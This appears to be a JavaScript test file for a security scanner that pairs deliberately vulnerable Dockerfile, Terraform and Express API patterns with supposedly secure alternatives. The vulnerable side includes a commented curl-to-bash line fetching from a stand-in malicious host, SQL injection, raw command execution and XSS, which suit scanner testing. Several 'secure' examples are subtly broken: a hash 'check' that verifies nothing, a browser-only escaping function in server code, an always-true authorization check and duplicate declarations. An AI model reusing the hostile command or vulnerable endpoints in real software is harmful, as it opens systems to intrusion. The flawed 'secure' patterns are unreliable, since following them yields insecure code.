// Advanced Security Examples for Sec4Dev Testing
// This file contains examples of various security vulnerabilities and secure alternatives

// ============================================================================
// 1. DOCKERFILE SECURITY EXAMPLES
// ============================================================================

// VULNERABLE Dockerfile patterns (these would be in actual Dockerfile)
/*
FROM node:latest  # ❌ Using latest tag
USER root         # ❌ Running as root
RUN curl http://malicious.com/script.sh | bash  # ❌ Piping curl to bash
ENV PASSWORD=secret123  # ❌ Hardcoded password
COPY /etc/passwd /tmp/  # ❌ Copying system files
RUN chmod 777 /app  # ❌ World-writable permissions
*/

// SECURE Dockerfile patterns
/*
FROM node:18-alpine  # ✅ Specific version
RUN adduser -D appuser  # ✅ Create non-root user
USER appuser  # ✅ Use non-root user
RUN wget https://example.com/script.sh && \
    sha256sum script.sh && \
    bash script.sh  # ✅ Download, verify, then execute
ENV PASSWORD=""  # ✅ Use build args or secrets
COPY --chown=appuser:appuser . /app  # ✅ Proper ownership
RUN chmod 755 /app  # ✅ Appropriate permissions
*/

// ============================================================================
// 2. INFRASTRUCTURE AS CODE EXAMPLES
// ============================================================================

// VULNERABLE Terraform patterns
/*
resource "aws_s3_bucket" "data" {
  bucket = "my-data-bucket"
  # ❌ Missing public_access_block
}

resource "aws_security_group" "web" {
  ingress {
    from_port = 0
    to_port = 0
    protocol = "-1"
    cidr_blocks = ["0.0.0.0/0"]  # ❌ Allow all traffic
  }
}

resource "aws_iam_user" "admin" {
  name = "admin"
  force_detach_policies = false  # ❌ Don't force detach
}
*/

// SECURE Terraform patterns
/*
resource "aws_s3_bucket" "data" {
  bucket = "my-data-bucket"
  
  public_access_block {
    block_public_acls = true
    block_public_policy = true
    ignore_public_acls = true
    restrict_public_buckets = true
  }
}

resource "aws_security_group" "web" {
  ingress {
    from_port = 443
    to_port = 443
    protocol = "tcp"
    cidr_blocks = ["10.0.0.0/8"]  # ✅ Specific CIDR
  }
}

resource "aws_iam_user" "admin" {
  name = "admin"
  force_detach_policies = true  # ✅ Force detach
}
*/

// ============================================================================
// 3. API SECURITY EXAMPLES
// ============================================================================

// VULNERABLE API patterns
const express = require('express');
const app = express();

// ❌ Missing authentication
app.get('/api/users', (req, res) => {
  const users = db.query('SELECT * FROM users');
  res.json(users);
});

// ❌ SQL injection vulnerable
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ success: true });
    }
  });
});

// ❌ XSS vulnerable
app.post('/api/comment', (req, res) => {
  const { comment } = req.body;
  const html = `<div class="comment">${comment}</div>`;
  db.query('INSERT INTO comments (content) VALUES (?)', [html]);
  res.json({ success: true });
});

// ❌ No rate limiting
app.post('/api/login', (req, res) => {
  // Login logic without rate limiting
});

// SECURE API patterns
const express = require('express');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const app = express();

// ✅ Security middleware
app.use(helmet());
app.use(express.json({ limit: '10kb' }));

// ✅ Rate limiting
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5 // limit each IP to 5 requests per windowMs
});

// ✅ Authentication middleware
const authenticateToken = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.sendStatus(401);
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

// ✅ Authorization middleware
const authorizeRole = (role) => {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
};

// ✅ Secure API endpoints
app.get('/api/users', authenticateToken, authorizeRole('admin'), (req, res) => {
  const users = db.query('SELECT id, name, email FROM users');
  res.json(users);
});

// ✅ Parameterized queries
app.post('/api/login', loginLimiter, (req, res) => {
  const { username, password } = req.body;
  
  // Input validation
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing credentials' });
  }
  
  const query = 'SELECT * FROM users WHERE username = ?';
  db.query(query, [username], (err, results) => {
    if (results.length > 0) {
      const user = results[0];
      bcrypt.compare(password, user.password_hash, (err, isMatch) => {
        if (isMatch) {
          const token = jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET);
          res.json({ token });
        } else {
          res.status(401).json({ error: 'Invalid credentials' });
        }
      });
    }
  });
});

// ✅ Output sanitization
app.post('/api/comment', authenticateToken, (req, res) => {
  const { comment } = req.body;
  
  // Input validation
  if (!comment || comment.length > 1000) {
    return res.status(400).json({ error: 'Invalid comment' });
  }
  
  // Store raw comment
  db.query('INSERT INTO comments (content, user_id) VALUES (?, ?)', 
    [comment, req.user.id], (err, result) => {
    res.json({ success: true });
  });
});

// ✅ Display with sanitization
app.get('/api/comments', (req, res) => {
  db.query('SELECT content FROM comments', (err, results) => {
    const comments = results.map(row => {
      return `<div class="comment">${escapeHtml(row.content)}</div>`;
    }).join('');
    res.send(`<div id="comments">${comments}</div>`);
  });
});

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ============================================================================
// 4. DATA FLOW ANALYSIS EXAMPLES
// ============================================================================

// VULNERABLE data flow patterns
app.post('/api/search', (req, res) => {
  const userInput = req.body.query;  // Source: user input
  
  // ❌ Direct flow to SQL query (sink)
  const query = `SELECT * FROM products WHERE name LIKE '%${userInput}%'`;
  db.query(query, (err, results) => {
    res.json(results);
  });
});

app.post('/api/execute', (req, res) => {
  const command = req.body.command;  // Source: user input
  
  // ❌ Direct flow to command execution (sink)
  exec(command, (error, stdout, stderr) => {
    res.json({ output: stdout });
  });
});

app.post('/api/render', (req, res) => {
  const userContent = req.body.content;  // Source: user input
  
  // ❌ Direct flow to HTML output (sink)
  const html = `<div>${userContent}</div>`;
  res.send(html);
});

// SECURE data flow patterns
app.post('/api/search', (req, res) => {
  const userInput = req.body.query;  // Source: user input
  
  // ✅ Input validation
  if (!userInput || userInput.length > 100) {
    return res.status(400).json({ error: 'Invalid query' });
  }
  
  // ✅ Parameterized query (sink with sanitization)
  const query = 'SELECT * FROM products WHERE name LIKE ?';
  db.query(query, [`%${userInput}%`], (err, results) => {
    res.json(results);
  });
});

app.post('/api/execute', (req, res) => {
  const command = req.body.command;  // Source: user input
  
  // ✅ Input validation and whitelisting
  const allowedCommands = ['ls', 'pwd', 'whoami'];
  if (!allowedCommands.includes(command)) {
    return res.status(400).json({ error: 'Invalid command' });
  }
  
  // ✅ Sanitized command execution (sink)
  exec(command, (error, stdout, stderr) => {
    res.json({ output: stdout });
  });
});

app.post('/api/render', (req, res) => {
  const userContent = req.body.content;  // Source: user input
  
  // ✅ Input validation
  if (!userContent || userContent.length > 1000) {
    return res.status(400).json({ error: 'Invalid content' });
  }
  
  // ✅ Sanitized HTML output (sink)
  const sanitizedContent = escapeHtml(userContent);
  const html = `<div>${sanitizedContent}</div>`;
  res.send(html);
});

// ============================================================================
// 5. RISK PRIORITIZATION EXAMPLES
// ============================================================================

// High-risk patterns (should be prioritized)
const highRiskExamples = {
  // Critical: User input → Code execution
  evalExample: {
    code: "eval(userInput)",
    risk: "critical",
    impact: "severe",
    likelihood: "likely"
  },
  
  // Critical: User input → SQL query
  sqlInjectionExample: {
    code: `SELECT * FROM users WHERE id = '${userInput}'`,
    risk: "critical",
    impact: "severe",
    likelihood: "likely"
  },
  
  // High: User input → HTML output
  xssExample: {
    code: `document.getElementById('content').innerHTML = userInput`,
    risk: "high",
    impact: "moderate",
    likelihood: "likely"
  }
};

// Medium-risk patterns
const mediumRiskExamples = {
  // Medium: Hardcoded secrets
  secretExample: {
    code: "const apiKey = 'sk-1234567890abcdef'",
    risk: "medium",
    impact: "moderate",
    likelihood: "unlikely"
  },
  
  // Medium: Weak encryption
  weakCryptoExample: {
    code: "const hash = md5(password)",
    risk: "medium",
    impact: "moderate",
    likelihood: "unlikely"
  }
};

// Low-risk patterns
const lowRiskExamples = {
  // Low: Suspicious but not necessarily malicious
  suspiciousExample: {
    code: "const result = data ^ 0x42",
    risk: "low",
    impact: "minor",
    likelihood: "unlikely"
  }
};

// ============================================================================
// 6. SECURITY TRAINING EXAMPLES
// ============================================================================

// Example of secure coding practices
class SecureAPI {
  constructor() {
    this.rateLimiters = new Map();
    this.validators = new Map();
  }
  
  // ✅ Input validation
  validateInput(input, schema) {
    const validator = this.validators.get(schema);
    if (!validator) {
      throw new Error('Unknown validation schema');
    }
    return validator.validate(input);
  }
  
  // ✅ Rate limiting
  checkRateLimit(userId, endpoint) {
    const key = `${userId}:${endpoint}`;
    const limiter = this.rateLimiters.get(key);
    
    if (!limiter) {
      this.rateLimiters.set(key, {
        count: 1,
        resetTime: Date.now() + 15 * 60 * 1000 // 15 minutes
      });
      return true;
    }
    
    if (Date.now() > limiter.resetTime) {
      limiter.count = 1;
      limiter.resetTime = Date.now() + 15 * 60 * 1000;
      return true;
    }
    
    if (limiter.count >= 100) {
      return false;
    }
    
    limiter.count++;
    return true;
  }
  
  // ✅ Secure authentication
  async authenticateUser(username, password) {
    // Input validation
    if (!username || !password) {
      throw new Error('Missing credentials');
    }
    
    // Rate limiting
    if (!this.checkRateLimit(username, 'login')) {
      throw new Error('Rate limit exceeded');
    }
    
    // Database query with parameterized statement
    const user = await db.query(
      'SELECT * FROM users WHERE username = ?',
      [username]
    );
    
    if (user.length === 0) {
      throw new Error('Invalid credentials');
    }
    
    // Secure password comparison
    const isValid = await bcrypt.compare(password, user[0].password_hash);
    
    if (!isValid) {
      throw new Error('Invalid credentials');
    }
    
    // Generate secure session token
    const token = jwt.sign(
      { userId: user[0].id, role: user[0].role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    return { token, user: user[0] };
  }
  
  // ✅ Secure data processing
  async processUserData(userId, data) {
    // Authorization check
    if (!this.isAuthorized(userId, 'process_data')) {
      throw new Error('Insufficient permissions');
    }
    
    // Input validation
    const validatedData = this.validateInput(data, 'userDataSchema');
    
    // Sanitize data
    const sanitizedData = this.sanitizeData(validatedData);
    
    // Secure database operation
    const result = await db.query(
      'INSERT INTO user_data (user_id, data) VALUES (?, ?)',
      [userId, JSON.stringify(sanitizedData)]
    );
    
    return result;
  }
  
  // ✅ Output sanitization
  sanitizeData(data) {
    return {
      name: escapeHtml(data.name),
      email: data.email.toLowerCase(),
      age: parseInt(data.age) || 0
    };
  }
  
  // ✅ Authorization check
  isAuthorized(userId, permission) {
    // Implementation would check user roles and permissions
    return true; // Simplified for example
  }
}

// ============================================================================
// 7. ENVIRONMENT CONFIGURATION
// ============================================================================

// ✅ Secure environment configuration
const config = {
  // Database
  database: {
    host: process.env.DB_HOST || 'localhost',
    port: parseInt(process.env.DB_PORT) || 5432,
    name: process.env.DB_NAME || 'app',
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    ssl: process.env.NODE_ENV === 'production'
  },
  
  // Security
  security: {
    jwtSecret: process.env.JWT_SECRET,
    bcryptRounds: parseInt(process.env.BCRYPT_ROUNDS) || 12,
    sessionTimeout: parseInt(process.env.SESSION_TIMEOUT) || 3600,
    maxLoginAttempts: parseInt(process.env.MAX_LOGIN_ATTEMPTS) || 5
  },
  
  // API
  api: {
    port: parseInt(process.env.PORT) || 3000,
    cors: {
      origin: process.env.CORS_ORIGIN?.split(',') || ['http://localhost:3000'],
      credentials: true
    },
    rateLimit: {
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: parseInt(process.env.RATE_LIMIT_MAX) || 100
    }
  }
};

// ============================================================================
// 8. SECURITY MIDDLEWARE
// ============================================================================

// ✅ Security middleware stack
const securityMiddleware = [
  // Basic security headers
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  }),
  
  // CORS configuration
  cors(config.api.cors),
  
  // Request size limiting
  express.json({ limit: '10kb' }),
  express.urlencoded({ extended: true, limit: '10kb' }),
  
  // Rate limiting
  rateLimit(config.api.rateLimit),
  
  // Request logging
  (req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
    next();
  }
];

module.exports = {
  securityMiddleware,
  SecureAPI,
  config
}; 